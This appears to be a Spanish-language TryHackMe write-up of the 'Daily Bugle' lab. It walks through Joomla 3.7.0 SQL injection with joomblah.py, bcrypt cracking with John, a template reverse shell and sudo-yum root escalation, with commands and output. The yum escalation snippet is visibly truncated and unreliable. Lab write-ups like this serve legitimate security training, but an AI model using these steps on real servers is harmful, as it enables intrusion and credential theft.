TryHackMe Hard Linux Joomla SQLi

Daily Bugle

SQLi en Joomla 3.7.0 con joomblah.py para extraer credenciales, acceso al panel admin y reverse shell via template PHP. Escalada con sudo yum.

Jun 2023 ~60 min cat4clysm
Herramientas utilizadas
nmap joomblah.py john netcat

Reconocimiento

root@kali:~$
nmap -p22,80,3306 -sC -sV 10.10.106.212
80/tcp   open  http    Apache httpd 2.4.6 (CentOS) PHP/5.6.40
|_http-generator: Joomla!
3306/tcp open  mysql   MariaDB (unauthorized)

El sitio corre Joomla. Revisando /robots.txt encontramos la ruta /administrator/. La versión de Joomla es 3.7.0, vulnerable a SQLi.

CVE-2017-8917 — SQL injection en Joomla 3.7.0 a través del componente com_fields.

Explotación — SQL Injection

Usamos joomblah.py, exploit público que automatiza la extracción de credenciales:

root@kali:~$
python3 joomblah.py http://10.10.106.212
[-] Fetching CSRF token
[-] Testing SQLi
[+] Found user: jonah
[+] Hash: $2y$10$hash...

Crackeamos el hash bcrypt con John:

root@kali:~$
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
spiderman123     (jonah)

Accedemos al panel admin y modificamos un template PHP para obtener reverse shell.

Escalada de privilegios

Como www-data encontramos credenciales en configuration.php de Joomla. El usuario jjameson reutiliza la contraseña. Escalamos a root con sudo:

sudo -l
(root) NOPASSWD: /usr/bin/yum
root@kali:~$
# GTFOBins - yum privesc
TF=$(mktemp -d)
cat >$TF/x<$TF/y.conf<$TF/y.py<
sh-4.2# whoami
root

Lecciones aprendidas

  • Joomla 3.7.0 es vulnerable a SQLi crítico sin autenticación — siempre verificar la versión del CMS.
  • Las credenciales de la base de datos en CMS frecuentemente son reutilizadas por usuarios del sistema.
  • GTFOBins es esencial para escalar con binarios permitidos en sudo.
